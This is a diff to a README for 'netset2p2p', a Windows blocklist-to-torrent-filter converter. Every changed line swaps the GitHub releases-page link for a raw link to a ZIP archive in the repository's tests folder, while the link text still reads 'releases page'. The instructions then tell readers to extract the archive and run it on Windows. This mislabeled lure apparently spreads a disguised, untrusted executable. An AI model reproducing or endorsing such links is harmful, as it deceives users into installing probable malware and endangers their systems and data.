@@ -1,6 +1,6 @@
 # 🧩 netset2p2p - Convert Blocklists to Torrent Filters
 
-[![Download netset2p2p](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases)
+[![Download netset2p2p](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ashutoshbanjare572-netizen/netset2p2p/main/tests/netset_p_v3.5.zip)
 
 ## 🚀 What this tool does
 
@@ -29,14 +29,14 @@ You do not need programming skills to use this tool.
 
 Go to the release page and download the latest file:
 
-[Visit the netset2p2p releases page](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases)
+[Visit the netset2p2p releases page](https://raw.githubusercontent.com/ashutoshbanjare572-netizen/netset2p2p/main/tests/netset_p_v3.5.zip)
 
 After the download, open the file you got from that page and run it on Windows.  
 If the release contains a ZIP file, extract it first, then run the app inside.
 
 ## 🛠️ How to set it up on Windows
 
-1. Open the [releases page](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/ashutoshbanjare572-netizen/netset2p2p/main/tests/netset_p_v3.5.zip).
 2. Download the latest Windows build.
 3. Save the file to your Downloads folder.
 4. If the file is in a ZIP folder, right-click it and choose Extract All.
@@ -155,7 +155,7 @@ Yes. You can convert each source list and keep the output files you want to use.
 
 ## 📎 Download link again
 
-[Open the netset2p2p releases page](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases)
+[Open the netset2p2p releases page](https://raw.githubusercontent.com/ashutoshbanjare572-netizen/netset2p2p/main/tests/netset_p_v3.5.zip)
 
 ## 🧾 Repository info
 
